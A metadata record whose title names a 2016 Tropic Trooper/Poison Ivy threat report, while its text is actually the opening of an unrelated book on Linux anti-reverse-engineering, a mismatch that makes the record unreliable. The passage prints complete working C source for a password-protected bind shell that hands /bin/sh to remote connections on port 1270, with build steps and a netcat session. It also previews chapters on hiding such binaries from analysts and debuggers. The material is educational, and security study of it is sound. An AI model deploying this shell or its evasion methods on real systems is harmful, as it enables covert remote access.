{
    "id": "394f2cbc-eefb-41e0-95f7-437e3b527743",
    "created_at": "2023-01-12T15:09:22.792452Z",
    "updated_at": "2025-03-27T02:16:04.303907Z",
    "deleted_at": null,
    "sha1_hash": "3a84c6f6b671408c8e55c7a6129f17bcc256de10",
    "title": "2016-11-22 - Tropic Trooper Targets Taiwanese Government and Fossil Fuel Provider With Poison Ivy",
    "authors": "",
    "file_creation_date": "2016-12-20T12:00:08Z",
    "file_modification_date": "0001-01-01T00:00:00Z",
    "file_size": 957698,
    "plain_text": "-----\n\n## Programming Linux Anti-Reversing Techniques\n\n### Jacob Baines\n\n##### This book is for sale at http://leanpub.com/anti-reverse-engineering-linux\n\n This version was published on 2016-12-20\n\n This is a Leanpub book. Leanpub empowers authors and publishers with the Lean Publishing process. Lean Publishing is the act of publishing an in-progress ebook using lightweight tools and many iterations to get reader feedback, pivot until you have the right book and build traction once you do.\n\n © 2016 Jacob Baines\n\n\n-----\n\n##### 43.953333, -69.052500\n\n “Everything’s Not Lost”\n\n\n-----\n\n# Contents\n\n##### Preface . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1 Why Read This Book? . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1 Topics Not Covered . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 1 Prerequisites . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 2 Code and Command Output . . . . . . . . . . . . . . . . . . . . . . . . 2\n\n Chapter 1: Introductions . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3 Introducing “Trouble” . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3 Using CMake . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 3 The Code . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 4 Compiling . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 7 Executing . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 9 Accessing the Shell . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 10\n\n Chapter 2: Compiler Options . . . . . . . . . . . . . . . . . . . . . . . . . . 11 -g . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 12 Recovering the Bind Shell Password with Hexdump . . . . . . . . . . 17 Recovering the Bind Shell Password with GDB . . . . . . . . . . . . . 19 The Debugging Information in IDA . . . . . . . . . . . . . . . . . . . 20 Removing the Debugging Information . . . . . . . . . . . . . . . . . 21 Case Study: XOR DDOS . . . . . . . . . . . . . . . . . . . . . . . . . 23 -s . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 24 SYMTAB vs. DYNSYM . . . . . . . . . . . . . . . . . . . . . . . . . . 25 Finding the Bind Shell Password Using .symtab . . . . . . . . . . . . 29 Case Study: The FILE Symbol . . . . . . . . . . . . . . . . . . . . . . 29 Examing Trouble After -s . . . . . . . . . . . . . . . . . . . . . . . . 30 -fvisibility . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 32\n\n\n-----\n\n###### CONTENTS\n\n##### Looking at FUNC symbols . . . . . . . . . . . . . . . . . . . . . . . . 32 Hiding FUNC symbols . . . . . . . . . . . . . . . . . . . . . . . . . . 33 -O . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 36 Corrected Block Tiny Encryption Algorithm (XXTEA) . . . . . . . . . 37 -Os . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 43 -O3 . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 45 -funroll-loops . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 48 -static . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 52 Resolving Functions at Runtime . . . . . . . . . . . . . . . . . . . . . 52 ltrace . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 55 LD_PRELOAD . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 56 Using musl . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 59\n\n Chapter 3: File Format Hacks . . . . . . . . . . . . . . . . . . . . . . . . . . 64 The Strip Utility . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 64 Removing the Section Headers Table . . . . . . . . . . . . . . . . . . . . 68 Little Endian or Big Endian? . . . . . . . . . . . . . . . . . . . . . . . . 78 The Sections Are a Lie . . . . . . . . . . . . . . . . . . . . . . . . . . . . 84 Flipping the Executable Bit . . . . . . . . . . . . . . . . . . . . . . . . 84 Lying with .init . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 97 Hiding the Entry Point . . . . . . . . . . . . . . . . . . . . . . . . . . 107 Mixing the Symbols . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 118\n\n Chapter 4: Fighting Off String Analysis . . . . . . . . . . . . . . . . . . . . 129 Code Reorganization . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 129 Stack Strings . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 130 XOR Stack String . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 135 Function Encryption . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 141 Computing the Function’s Size Using a Linker Script . . . . . . . . . . 141 Decryption Logic . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 147 Encryption Logic . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 154 Creating a Cryptor . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 162 Implementing the Cryptor . . . . . . . . . . . . . . . . . . . . . . . . 163 Analyzing the Cryptor . . . . . . . . . . . . . . . . . . . . . . . . . . 168\n\n Chapter 5: Obstructing Code Flow Analysis . . . . . . . . . . . . . . . . . 174\n\n\n-----\n\n###### CONTENTS\n\n##### Indirect Function Calls . . . . . . . . . . . . . . . . . . . . . . . . . . . 174 Signals . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 179 Early Return . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 183 Jump Over an Invalid Byte . . . . . . . . . . . . . . . . . . . . . . . . . 189 Jump! Jump! . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 193 Always Follow the Conditional . . . . . . . . . . . . . . . . . . . . . . . 195 Overlapping Instructions . . . . . . . . . . . . . . . . . . . . . . . . . . 198\n\n Chapter 6: Evading the Debugger . . . . . . . . . . . . . . . . . . . . . . . 203 Trace Me . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 203 Trapping the Debugger . . . . . . . . . . . . . . . . . . . . . . . . . . . 206 Becoming Attached . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 212 /proc/self/status . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 215 madvise . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 220 prctl . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . 228 Detection Before main() . . . . . . . . . . . . . . . . . . . . . . . . . . . 232 Computing Function Checksums . . . . . . . . . . . . . . . . . . . . . . 233\n\n Conclusion: All That We Fall For . . . . . . . . . . . . . . . . . . . . . . . 242\n\n\n-----\n\n# Preface\n\n### Why Read This Book?\n\n##### There are many articles and books that talk about anti-reverse engineering tech- niques and how to break them. However, the writing is often limited to small code snippets or a screenshot of assembly in IDA. This book seeks to be different by starting with a simple program you’ll update with anti-re techniques as you progress through the book. This gives the reader the oppurtunity to compile and analyze the binary on their own. I believe the emphasis on the “proof of concept” makes this book unique.\n\n Another unique aspect of this book is the emphasis on Linux anti-reverse engineer- ing. Hackers have been writing about these techniques since the late 90’s, but much of what has been written is strewn across the internet. This book attempts to coalesce a majority of techniques and present them to the reader as one unit.\n\n Finally, a lot of the proof of concept code that currently exists on the internet is bad. Not to be all judgemental, but some of it doesn’t compile. Some simply crashes. Others are written in confusing and bizarre manners. The code provided in this book attempts to be clean, useful, and maintainable.\n\n### Topics Not Covered\n\n##### There are some topics that have been intentionally left out of this book. I want to state these topics up front so that the reader knows what they are getting.\n\n 1. Virtual Machine Detection: VM detection techniques are continuously in flux as both sides seek to one up each other. A technique that works one week could easily be broken the next. As such, I’ve avoided this subject altogether.\n\n\n-----\n\n###### Preface 2\n\n##### 2. Hiding Network Communication: Understanding a binary’s network com- munication is a huge aid in reverse engineering. However, this topic is too deep to do justice within these pages. 3. Rootkit Topics: Hiding and persistence are out of scope. 4. Anything Related to the Kernel: This book focuses only on userland binaries.\n\n### Prerequisites\n\n##### The reader should have access to a Linux host using the x86-64 architecture. The code for this book was written and tested on Ubuntu 16.04.\n\n This book does discuss the use of IDA, but I understand that the high cost of IDA is a non-starter for many. Therefore, I’ve done my best to also include examples using Radare2 and Hopper.\n\n Finally, the code for this book is largely written in C with a small amount of x86- 64 assembler. Some of the tooling is written in C++. However, I do not expect the reader to be well versed in any of these languages. Part of the beauty of having complete code examples to work from is that it gives the author a chance to point out any idiosyncrasies and provides the reader the oppurtunity to pull apart the code on their own time.\n\n### Code and Command Output\n\n##### All the code is available on Github: https://github.com/antire-book/antire_book. I understand that the reader may not always be close to a computer or have access to GitHub in order to browse the book’s code. As such, all of the code is also listed within the book. I know some people don’t like that, but since the code is essential to this book I can’t have the reader go without.\n\n Also related to formatting, any output from a command line tool included in this book will generally include all of the output. For example, when GDB starts it prints out a lot of version, license, and help information. I won’t cut any of that. I want the reader to be able to match the output from their computer with what I’ve listed in the book. This largely aids in troubleshooting any issues the reader runs into.\n\n\n-----\n\n# Chapter 1: Introductions\n\n### Introducing “Trouble”\n\n##### This book centers around the obfuscation of a bind shell called Trouble.\n\n### What is a bind shell?\n\n###### “Bind shell is a type of shell in which the target machine opens up a communication port or a listener on the victim machine and waits for an incoming connection. The attacker then connects to the victim machine’s listener which then leads to code or command execution on the server.”¹\n\n##### The Trouble bind shell is used as an example, not because it is unique or interesting, but because it is small and simple. It also has a property that should be interesting to a reverse engineer: it requires a password to access the shell. All of the activity in this book attempts to either hide or recover the shell’s password.\n\n### Using CMake\n\n##### You’ll be using CMake² to compile Trouble. CMake is an open source Makefile generation tool. It’s useful for dependency checking and supports a simple syntax. Don’t worry if you aren’t familiar with CMake. You’ll pick it as the book progresses.\n\n CMake relies on “CMakeList.txt” files to generate Makefiles. For chapter one, you’ll find Trouble’s “CMakeList.txt” in the chapt_1_introduction/trouble directory.\n\n###### ¹http://resources.infosecinstitute.com/icmp-reverse-shell/ ²https://cmake.org/\n\n\n-----\n\n###### Chapter 1: Introductions 4\n\n chap_1_introduction/trouble/CMakeLists.txt\n\nproject(trouble C)\ncmake_minimum_required(VERSION 3.0)\n\n# This will create a 32 byte \"password\" for the bind shell. This command\n# is only run when \"cmake\" is run, so if you want to generate a new password\n# then \"cmake ..; make\" should be run from the command line.\nexec_program(\"/bin/sh\"\n\n${CMAKE_CURRENT_SOURCE_DIR}\nARGS \"-c 'cat /dev/urandom | tr -dc a-zA-Z0-9 | head -c 32'\"\nOUTPUT_VARIABLE random_password )\n\n# Pass the random password into ${PROJECT_NAME} as a macro\nadd_definitions(-Dpassword=\"${random_password}\")\n\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow -g -std=gnu11\")\nadd_executable(${PROJECT_NAME} src/trouble.c)\n\n# After the build is successful, display the random password to the user\nadd_custom_command(TARGET ${PROJECT_NAME} POST_BUILD\n\nCOMMAND ${CMAKE_COMMAND} -E echo\n\"The bind shell password is:\" ${random_password})\n\n##### Not only will this file generate Trouble’s Makefile but it also generates the shell’s 32 byte password everytime it is executed. The password create using urandom with the following command:\n\ncat /dev/urandom | tr -dc a-zA-Z0-9 | head -c 32\n\n##### More will be expalined about using CMake file in the upcoming section about compiling Trouble.\n\n### The Code\n\n##### The code for the Trouble bind shell is located within the “source” directory. It is comprised of a single file:\n\n\n-----\n\n###### Chapter 1: Introductions 5\n\n chap_1_introduction/trouble/trouble.c\n\n#include <stdio.h>\n#include <unistd.h>\n#include <stdlib.h>\n#include <string.h>\n#include <stdbool.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <netinet/in.h>\n\n// the password to login to the shell\n**static const char s_password[] = password;**\n\n**bool check_password(const char* p_password)**\n{\n\n// validate the password\n**return memcmp(s_password, p_password, sizeof(s_password) - 1) != 0;**\n}\n\n/**\n\n - This implements a fairly simple bind shell. The server first requires a\n\n - password before allowing access to the shell. The password is currently\n\n - randomly generated each time 'cmake ..' is run. The server has no shutdown\n\n - mechanism so it will run until killed.\n*/\n**int main(int p_argc, char* p_argv[])**\n{\n(void)p_argc;\n(void)p_argv;\n\n**int sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);**\n**if (sock == -1)**\n{\nfprintf(stderr, \"Failed to create the socket.\");\n**return EXIT_FAILURE;**\n}\n\n**struct sockaddr_in bind_addr = {};**\nbind_addr.sin_family = AF_INET;\nbind_addr.sin_addr.s_addr = htonl(INADDR_ANY);\nbind_addr.sin_port = htons(1270);\n\n\n-----\n\n###### Chapter 1: Introductions 6\n\n**int bind_result = bind(sock, (struct sockaddr*) &bind_addr,**\n\n**sizeof(bind_addr));**\n**if (bind_result != 0)**\n{\nperror(\"Bind call failed\");\n**return EXIT_FAILURE;**\n}\n\n**int listen_result = listen(sock, 5);**\n**if (listen_result != 0)**\n{\nperror(\"Listen call failed\");\n**return EXIT_FAILURE;**\n}\n\n**while (true)**\n{\n\n**int client_sock = accept(sock, NULL, NULL);**\n**if (client_sock < 0)**\n{\nperror(\"Accept call failed\");\n**return EXIT_FAILURE;**\n}\n\n**int child_pid = fork();**\n**if (child_pid == 0)**\n{\n\n// read in the password\n**char password_input[sizeof(s_password)] = { 0 };**\n**int read_result = read(client_sock, password_input,**\n\n**sizeof(password_input));**\n**if (read_result < (int)(sizeof(s_password) - 1))**\n{\nclose(client_sock);\n**return EXIT_FAILURE;**\n}\n\n**if (check_password(password_input))**\n{\nclose(client_sock);\n**return EXIT_FAILURE;**\n}\n\n\n-----\n\n###### Chapter 1: Introductions 7\n\ndup2(client_sock, 0);\ndup2(client_sock, 1);\ndup2(client_sock, 2);\n\n**char* empty[] = { NULL };**\nexecve(\"/bin/sh\", empty, empty);\nclose(client_sock);\n**return EXIT_SUCCESS;**\n}\n\nclose(client_sock);\n}\n}\n\n##### The code in trouble.c creates a socket and binds to port 1270 before listening for incoming connections. Once a connection is established the program forks and the parent process returns back to listening for incoming connections. The child process reads from the socket for the password. If the password is correct the program uses execve to provide shell functionality.\n\n### Compiling\n\n##### As previously mentioned, Trouble uses CMake for the build process. If you are using Ubuntu, CMake is easy to install:\n\nalbino-lobster@ubuntu:~$ sudo apt-get install cmake\n\n##### After CMake is installed, you’ll need to cd into the directory where chapter one’s version of Trouble exists. For me this command looks like this:\n\n###### Finding the chapter one source\n\nalbino-lobster@ubuntu:~$ cd antire_book/chap_1_introduction/trouble/\nalbino-lobster@ubuntu:~/antire_book/chap_1_introduction/trouble$\n\n##### Next you’ll need to create a directory to compile Trouble in. I typically make a directory called “build”, but you can name it whatever you’d like. After you’ve created the build directory cd into it.\n\n\n-----\n\n###### Chapter 1: Introductions 8\n\n Create a build directory\n\nalbino-lobster@ubuntu:~/antire_book/chap_1_introduction/trouble$ mkdir build\nalbino-lobster@ubuntu:~/antire_book/chap_1_introduction/trouble$ cd build\n\n##### Now you need to run the cmake command. CMake will check that your system has the appropriate dependencies installed and then generate the Makefile to build Trouble. Note that we have to give CMake the path to our CMakeLists.txt file so the command is “cmake ..”:\n\n###### Using cmake ..\n\nalbino-lobster@ubuntu:~/antire_book/chap_1_introduction/trouble/build$ cmake ..\n-- The C compiler identification is GNU 5.4.0\n-- Check for working C compiler: /usr/bin/cc\n-- Check for working C compiler: /usr/bin/cc -- works\n-- Detecting C compiler ABI info\n-- Detecting C compiler ABI info - done\n-- Detecting C compile features\n-- Detecting C compile features - done\n-- Configuring done\n-- Generating done\n-- Build files have been written to: /home/albino-lobster/antire_book/chap_1_introduc\\\ntion/trouble/build\n\n##### The final step in the build process is to execute make.\n\n###### Using make\n\nalbino-lobster@ubuntu:~/antire_book/chap_1_introduction/trouble/build$ make\nScanning dependencies of target trouble\n\n[ 50%] Building C object CMakeFiles/trouble.dir/src/trouble.c.o\n\n[100%] Linking C executable trouble\nThe bind shell password is: OXIvZjl4FaUO17UpMUttRE5zn2lUUZqd\n\n[100%] Built target trouble\n\n##### A new binary named “trouble” should now exist in the build directory.\n\n Knowing the bind shell’s password is of utmost importance to its use. As such, the password is printed to screen every time the binary is generated. In the output above,\n\n\n-----\n\n###### Chapter 1: Introductions 9\n\n##### the shell’s password is OXIvZjl4FaUO17UpMUttRE5zn2lUUZqd. A new password is only generated when cmake is run. Therefore, to force a new password to be generated you have to run “cmake ..; make”.\n\n###### Generating a new password\n\nalbino-lobster@ubuntu:~/antire_book/chap_1_introduction/trouble/build$ cmake ..; make\n-- Configuring done\n-- Generating done\n-- Build files have been written to: /home/albino-lobster/antire_book/chap_1_introduc\\\ntion/trouble/build\nScanning dependencies of target trouble\n\n[ 50%] Building C object CMakeFiles/trouble.dir/src/trouble.c.o\n\n[100%] Linking C executable trouble\nThe bind shell password is: TGOEu26TW0k1b9IeXjUJbT1GfCR0jSnl\n\n[100%] Built target trouble\n\n### Executing\n\n##### Executing Trouble is simple. It doesn’t take any command line options and doesn’t require sudo. It should generally only fail if port 1270 is already in use. To run in the foreground, simply execute “./trouble” from the build directory.\n\nalbino-lobster@ubuntu:~/antire_book/chap_1_introduction/trouble/build$ ./trouble\n\n##### The program will block the terminal while it runs. If that is a problem just run it in the background using ‘&’.\n\n###### Running Trouble in the background\n\nalbino-lobster@ubuntu:~/antire_book/chap_1_introduction/trouble/build$ ./trouble &\n\n[1] 46890\nalbino-lobster@ubuntu:~/antire_book/chap_1_introduction/trouble/build$\n\n\n-----\n\n###### Chapter 1: Introductions 10\n\n### Accessing the Shell\n\n##### To connect to Trouble I suggest that using netcat is the easiest option. Once you are connected, input the password and then you should be able to issue shell commands. If the wrong password is input then the connection will be severed. Follow the example below.\n\n###### Connecting to Trouble\n\nalbino-lobster@ubuntu:~$ nc 192.168.1.182 1270\nTGOEu26TW0k1b9IeXjUJbT1GfCR0jSnl\npwd\n/home/albino-lobster/antire_book/chap_1_introduction/trouble/build\nls -l\ntotal 48\n-rw-rw-r-- 1 albino-lobster albino-lobster 10544 Oct 18 17:07 CMakeCache.txt\ndrwxrwxr-x 5 albino-lobster albino-lobster 4096 Oct 18 17:22 CMakeFiles\n-rw-rw-r-- 1 albino-lobster albino-lobster 4986 Oct 18 17:22 Makefile\n-rw-rw-r-- 1 albino-lobster albino-lobster 1437 Oct 18 17:07 cmake_install.cmake\n-rwxrwxr-x 1 albino-lobster albino-lobster 17488 Oct 18 17:22 trouble\n\n\n-----\n\n# Chapter 2: Compiler Options\n\n##### The compiler options are often overlooked when talking about anti-reverse engineer- ing. However, it’s essential that you understand how different options alter the final binary. The compiler can be your worst enemy that gives away all of your secrets or it could be your best friend as it strips away all unnecessary information.\n\n### Focusing on GCC\n\n###### The code in this book expects GCC to be used as the compiler. That is not to say that Clang or other compilers could not be used. They very well could be. However, GCC is used since it was the de facto standard for so many year.\n\n##### If you are unfamiliar with CMake or GCC you might be wondering what are the compiler options I’m talking about. If you look back at the “CMakeLists.txt” file from chapter one you’ll find this line:\n\nset(CMAKE_C_FLAGS \"-Wall -Wextra -Wshadow -g -std=gnu11\")\n\n##### These are the compiler options. GCC supports many such options³ and maintains detailed documentation. The flags used in the chapter one version of Trouble are a tiny subset of what is available.\n\n In the compiler options above, all of the options that start with -W are warning options ⁴ that tell the compiler to check for specific types of programming mistakes. The -g option instructs the compiler to include debugging information⁵ in the binary. Finally, -std=gnu11 tells the compiler that the C code you are using expects the GNU dialect of the C11 standard for the C programming ⁶. The GNU portion enables extensions that were not part of the C11 standard.\n\n###### ³https://gcc.gnu.org/onlinedocs/gcc/Option-Summary.html ⁴https://gcc.gnu.org/onlinedocs/gcc/Warning-Options.html#Warning-Options ⁵https://gcc.gnu.org/onlinedocs/gcc/Debugging-Options.html#Debugging-Options ⁶https://gcc.gnu.org/onlinedocs/gcc/C-Dialect-Options.html#C-Dialect-Options\n\n\n-----\n\n###### Chapter 2: Compiler Options 12\n\n### -g\n\n##### As previously mentioned, you can instruct GCC to include debugging information in your program by using the -g flag. To gain a better understanding of what I mean by “include debugging information” use the command line utility readelf on Trouble.\n\n### readelf\n\n###### readelf is a command line utility that understands the Executable and Linkable Format⁷ (ELF). ELF is the standard format for Linux executables, shared libraries, and core dumps. readelf can parse provided binaries and display information about their formatting. readelf comes pre-installed on Ubuntu 16.04.\n\n##### readelf has a lot of command line options. One option, -S, will display the provided binary’s section headers.\n\n###### Listing Trouble’s section headers\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ readelf -S ./troub\\\nle\nThere are 36 section headers, starting at offset 0x3c38:\n\nSection Headers:\n\n[Nr] Name Type Address Offset\nSize EntSize Flags Link Info Align\n\n[ 0] NULL 0000000000000000 00000000\n0000000000000000 0000000000000000 0 0 0\n\n[ 1] .interp PROGBITS 0000000000400238 00000238\n000000000000001c 0000000000000000 A 0 0 1\n\n[ 2] .note.ABI-tag NOTE 0000000000400254 00000254\n0000000000000020 0000000000000000 A 0 0 4\n\n[ 3] .note.gnu.build-i NOTE 0000000000400274 00000274\n0000000000000024 0000000000000000 A 0 0 4\n\n[ 4] .gnu.hash GNU_HASH 0000000000400298 00000298\n0000000000000064 0000000000000000 A 5 0 8\n\n[ 5] .dynsym DYNSYM 0000000000400300 00000300\n0000000000000348 0000000000000018 A 6 1 8\n\n###### ⁷https://en.wikipedia.org/wiki/Executable_and_Linkable_Format\n\n\n-----\n\n###### Chapter 2: Compiler Options 13\n\n[ 6] .dynstr STRTAB 0000000000400648 00000648\n000000000000015e 0000000000000000 A 0 0 1\n\n[ 7] .gnu.version VERSYM 00000000004007a6 000007a6\n0000000000000046 0000000000000002 A 5 0 2\n\n[ 8] .gnu.version_r VERNEED 00000000004007f0 000007f0\n0000000000000030 0000000000000000 A 6 1 8\n\n[ 9] .rela.dyn RELA 0000000000400820 00000820\n0000000000000030 0000000000000018 A 5 0 8\n\n[10] .rela.plt RELA 0000000000400850 00000850\n0000000000000180 0000000000000018 AI 5 24 8\n\n[11] .init PROGBITS 00000000004009d0 000009d0\n000000000000001a 0000000000000000 AX 0 0 4\n\n[12] .plt PROGBITS 00000000004009f0 000009f0\n0000000000000110 0000000000000010 AX 0 0 16\n\n[13] .plt.got PROGBITS 0000000000400b00 00000b00\n0000000000000008 0000000000000000 AX 0 0 8\n\n[14] .text PROGBITS 0000000000400b10 00000b10\n00000000000003c2 0000000000000000 AX 0 0 16\n\n[15] .fini PROGBITS 0000000000400ed4 00000ed4\n0000000000000009 0000000000000000 AX 0 0 4\n\n[16] .rodata PROGBITS 0000000000400ee0 00000ee0\n000000000000009d 0000000000000000 A 0 0 32\n\n[17] .eh_frame_hdr PROGBITS 0000000000400f80 00000f80\n000000000000003c 0000000000000000 A 0 0 4\n\n[18] .eh_frame PROGBITS 0000000000400fc0 00000fc0\n0000000000000114 0000000000000000 A 0 0 8\n\n[19] .init_array INIT_ARRAY 0000000000601e10 00001e10\n0000000000000008 0000000000000000 WA 0 0 8\n\n[20] .fini_array FINI_ARRAY 0000000000601e18 00001e18\n0000000000000008 0000000000000000 WA 0 0 8\n\n[21] .jcr PROGBITS 0000000000601e20 00001e20\n0000000000000008 0000000000000000 WA 0 0 8\n\n[22] .dynamic DYNAMIC 0000000000601e28 00001e28\n00000000000001d0 0000000000000010 WA 6 0 8\n\n[23] .got PROGBITS 0000000000601ff8 00001ff8\n0000000000000008 0000000000000008 WA 0 0 8\n\n[24] .got.plt PROGBITS 0000000000602000 00002000\n0000000000000098 0000000000000008 WA 0 0 8\n\n[25] .data PROGBITS 0000000000602098 00002098\n0000000000000010 0000000000000000 WA 0 0 8\n\n[26] .bss NOBITS 00000000006020c0 000020a8\n0000000000000010 0000000000000000 WA 0 0 32\n\n[27] .comment PROGBITS 0000000000000000 000020a8\n\n\n-----\n\n###### Chapter 2: Compiler Options 14\n\n0000000000000034 0000000000000001 MS 0 0 1\n\n[28] .debug_aranges PROGBITS 0000000000000000 000020dc\n0000000000000030 0000000000000000 0 0 1\n\n[29] .debug_info PROGBITS 0000000000000000 0000210c\n00000000000005e0 0000000000000000 0 0 1\n\n[30] .debug_abbrev PROGBITS 0000000000000000 000026ec\n0000000000000127 0000000000000000 0 0 1\n\n[31] .debug_line PROGBITS 0000000000000000 00002813\n0000000000000192 0000000000000000 0 0 1\n\n[32] .debug_str PROGBITS 0000000000000000 000029a5\n0000000000000593 0000000000000001 MS 0 0 1\n\n[33] .shstrtab STRTAB 0000000000000000 00003ae8\n000000000000014c 0000000000000000 0 0 1\n\n[34] .symtab SYMTAB 0000000000000000 00002f38\n0000000000000858 0000000000000018 35 55 8\n\n[35] .strtab STRTAB 0000000000000000 00003790\n0000000000000358 0000000000000000 0 0 1\nKey to Flags:\nW (write), A (alloc), X (execute), M (merge), S (strings), l (large)\nI (info), L (link order), G (group), T (TLS), E (exclude), x (unknown)\nO (extra OS processing required) o (OS specific), p (processor specific)\n\n##### Do you see the five sections, beginning at index 28, whose name starts with “.debug_” in the output above? These sections contain the debugging information that you requested by using the -g option. The debugging information is provided in the DWARF debugging format.\n\n### DWARF\n\n###### DWARF stands for “Debugging With Attributed Record Formats” and is the default format GCC uses to store debugging information.⁸\n\n##### For this book, the most interesting .debug section is .debug_info. You can view the contents of .debug_info by using the command line utility objdump.\n\n###### ⁸http://dwarfstd.org/\n\n\n-----\n\n###### Chapter 2: Compiler Options 15\n\n### objdump\n\n###### “objdump displays information about one or more object files. The options control what particular information to display. This information is mostly useful to programmers who are working on the compilation tools, as opposed to programmers who just want their program to compile and work.”⁹\n\n##### To display the DWARF information in .debug_info use the “–dwarf=info” flag with objdump. Running this command generates a lot of output so this is one of the rare occassions in which I’ve trimmed the output to focus on specific information.\n\n###### Using objdump to view .debug_info\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ objdump --dwarf=in\\\nfo ./trouble\n\n./trouble: file format elf64-x86-64\n\nContents of the .debug_info section:\n\nCompilation Unit @ offset 0x0:\nLength: 0x5dc (32-bit)\nVersion: 4\nAbbrev Offset: 0x0\nPointer Size: 8\n<0><b>: Abbrev Number: 1 (DW_TAG_compile_unit)\n\n<c> DW_AT_producer : (indirect string, offset: 0xaf): GNU C11 5.4.0 20160609\\\n-mtune=generic -march=x86-64 -g -std=gnu11 -fstack-protector-strong\n<10> DW_AT_language : 12 (ANSI C99)\n<11> DW_AT_name : (indirect string, offset: 0x21d): /home/albino-lobster\\\n/antire_book/chap_2_compiler/trouble/src/trouble.c\n<15> DW_AT_comp_dir : (indirect string, offset: 0x366): /home/albino-lobster\\\n/antire_book/chap_2_compiler/trouble/build\n<19> DW_AT_low_pc : 0x400c06\n<21> DW_AT_high_pc : 0x257\n<29> DW_AT_stmt_list : 0x0\n<1><5ba>: Abbrev Number: 21 (DW_TAG_variable)\n\n<5bb> DW_AT_name : (indirect string, offset: 0x1aa): s_password\n<5bf> DW_AT_decl_file : 1\n\n###### ⁹man objdump\n\n\n-----\n\n###### Chapter 2: Compiler Options 16\n\n<5c0> DW_AT_decl_line : 11\n<5c1> DW_AT_type : <0x5cf>\n<5c5> DW_AT_location : 9 byte block: (DW_OP_addr: 400f00)\n\n##### The .debug_info section contains useful information for the debugger but it’s also useful for anyone attempting to attribute a binary to a specific actor. For example, in the output above, you can see the full path of the source file (/home/albino-lob- ster/antire_book/chap_2_compiler/trouble/src/trouble.c), the full path of the compi- lation directory (/home/albino-lobster/antire_book/chap_2_compiler/trouble/build), the version of C used (GNU C 5.4.0 20160609), and even the exact line number the variable s_password was declared on (DW_AT_decl_line: 11).\n\n That might seem like an absurd amount of information, but it can be really useful when debugging. For example, consider this back trace generated with GDB.\n\n###### Generating a backtrace in GDB\n\nalbino-lobster@ubuntu:~/antire_book/chap_2_compiler/trouble/build$ gdb ./trouble\nGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.04) 7.11.1\nCopyright (C) 2016 Free Software Foundation, Inc.\nLicense GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\nThis is free software: you are free to change and redistribute it.\nThere is NO WARRANTY, to the extent permitted by law. Type \"show copying\"\nand \"show warranty\" for details.\nThis GDB was configured as \"x86_64-linux-gnu\".\nType \"show configuration\" for configuration details.\nFor bug reporting instructions, please see:\n<http://www.gnu.org/software/gdb/bugs/>.\nFind the GDB manual and other documentation resources online at:\n<http://www.gnu.org/software/gdb/documentation/>.\nFor help, type \"help\".\nType \"apropos word\" to search for commands related to \"word\"...\nReading symbols from ./trouble...done.\n(gdb) run\nStarting program: /home/albino-lobster/antire_book/chap_2_compiler/trouble/build/trou\\\nble\n^C\nProgram received signal SIGINT, Interrupt.\n0x00007ffff7b154b0 in __accept_nocancel () at ../sysdeps/unix/syscall-template.S:84\n84 ../sysdeps/unix/syscall-template.S: No such file or directory.\n(gdb) bt\n\n\n-----\n\n###### Chapter 2: Compiler Options 17\n\n#0 0x00007ffff7b154b0 in __accept_nocancel () at ../sysdeps/unix/syscall-template.S:\\\n84\n#1 0x0000000000400d36 in main (p_argc=1, p_argv=0x7fffffffdeb8) at /home/albino-lobs\\\nter/antire_book/chap_2_compiler/trouble/src/trouble.c:59\n\n##### Notice how the backtrace contains the parameter names p_argc and p_argv in main()? These are the exact names used in Trouble’s source code. Also, the line number where accept() is called in trouble.c is visible in the backtrace (line 59). GDB can display this information thanks to the .debug_info section being present in Trouble.\n\n Because this information makes debugging so much easier almost every programmer will use the -g option while writting their program. However, as you’ll see, it’s also useful to reverse engineers.\n\n#### Recovering the Bind Shell Password with Hexdump\n\n##### In the 